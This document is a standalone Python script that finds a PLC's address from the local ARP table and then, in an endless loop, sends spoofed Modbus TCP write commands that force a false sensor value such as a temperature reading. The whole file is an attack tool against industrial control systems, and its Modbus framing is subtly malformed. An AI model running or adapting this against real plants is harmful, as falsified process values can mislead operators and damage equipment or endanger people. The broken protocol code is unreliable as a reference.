import socket
import struct
import time
import subprocess

# --- Configuration ---
# Placeholder for PLC's IP address.  Will be discovered automatically.
PLC_IP = None 
SPOOFED_TAG_NAME = "TemperatureSensor1"  # Example tag name to spoof.  Adjust as needed.
SPOOFED_VALUE = 75.0  # Example spoofed value (e.g., temperature). Adjust as needed.  Must match data type.
REPORTING_MESSAGE_TYPE = "Modbus"  # Example: Modbus, Ethernet/IP.  Adjust as needed.  This drastically changes the implementation.
REPORTING_MESSAGE_INTERVAL = 5  # Seconds between spoofed messages.
INTERFACE_NAME = "Ethernet" # Change to match the network interface name on the Windows machine
# --- End Configuration ---

def find_plc_ip(interface_name):
    """
    Attempts to find the PLC's IP address by looking for ARP entries.
    This relies on the Engineering Workstation communicating with the PLC.
    Important:  This requires elevated privileges (Run as Administrator).
    """
    try:
        # Execute the 'arp -a' command
        arp_output = subprocess.check_output(["arp", "-a", interface_name], universal_newlines=True)

        # Parse the ARP output to find the PLC's IP address
        for line in arp_output.splitlines():
            if "physical" in line:  # Filter lines with MAC addresses (likely devices)
                parts = line.split()
                if len(parts) > 1: #Making sure the parts list has enough elements
                    ip_address = parts[0]
                    # Validate IP address format using string manipulation (No regex)
                    ip_parts = ip_address.split('.')
                    if len(ip_parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip_parts):
                        print(f"Found potential PLC IP address: {ip_address}")
                        return ip_address
        
        print("PLC IP address not found in ARP table.  Ensure Engineering Workstation is communicating with the PLC.")
        return None
    except FileNotFoundError:
        print("Error: 'arp' command not found.  Ensure it is in your system's PATH.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error executing 'arp -a': {e}")
        return None

def construct_modbus_spoofed_message(tag_name, spoofed_value):
    """
    Constructs a spoofed Modbus message.
    This is a simplified example and may need significant modification
    depending on the specific Modbus implementation of the PLC.

    Assumptions:
        - Modbus TCP
        - Function Code 6 (Write Single Register) -  This is *very* common for writing values.
        - Register Address is hardcoded (highly likely to need adjustment).
        - Value is a float, encoded as a 32-bit float.
    """

    TRANSACTION_IDENTIFIER = 1 # Unique ID for the transaction
    PROTOCOL_IDENTIFIER = 0 # Modbus protocol
    UNIT_IDENTIFIER = 1 # Slave address (PLC Address) - **MOST LIKELY REQUIRES ADJUSTMENT**

    # Register Address (Example - REPLACE WITH THE ACTUAL REGISTER ADDRESS FOR YOUR TAG)
    REGISTER_ADDRESS = 40001 # Example Temperature Sensor Register
    
    # Convert the float value to a 32-bit float (IEEE 754)
    value_bytes = struct.pack('>f', spoofed_value)

    # Structure of the Modbus PDU (Protocol Data Unit)
    function_code = 6  # Write Single Register

    # Construct the Modbus PDU
    pdu = struct.pack('>BHH', function_code, REGISTER_ADDRESS, struct.unpack('>H', value_bytes[:2])[0]) + value_bytes[2:]
    # Calculate the length of the Modbus PDU
    length = len(pdu) + 1
    # Construct the Modbus Header (MBAP - Modbus Application Protocol header)
    header = struct.pack('>HHH', TRANSACTION_IDENTIFIER, PROTOCOL_IDENTIFIER, length)
    header += struct.pack('>B',UNIT_IDENTIFIER)

    # Combine the header and PDU to create the complete Modbus message
    message = header + pdu
    return message


def send_spoofed_message(plc_ip, message):
    """Sends the spoofed message to the PLC."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))  # Standard Modbus port is 502
        sock.sendall(message)
        print(f"Spoofed message sent to {plc_ip}")
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        if sock:
            sock.close()



def main():
    global PLC_IP
    PLC_IP = find_plc_ip(INTERFACE_NAME)

    if not PLC_IP:
        print("Could not automatically determine PLC IP. Exiting.")
        return

    print(f"Using PLC IP: {PLC_IP}")

    if REPORTING_MESSAGE_TYPE == "Modbus":
        while True:
            spoofed_message = construct_modbus_spoofed_message(SPOOFED_TAG_NAME, SPOOFED_VALUE)
            send_spoofed_message(PLC_IP, spoofed_message)
            time.sleep(REPORTING_MESSAGE_INTERVAL)
    else:
        print(f"Unsupported REPORTING_MESSAGE_TYPE: {REPORTING_MESSAGE_TYPE}.  Must implement the appropriate message construction function.")

if __name__ == "__main__":
    main()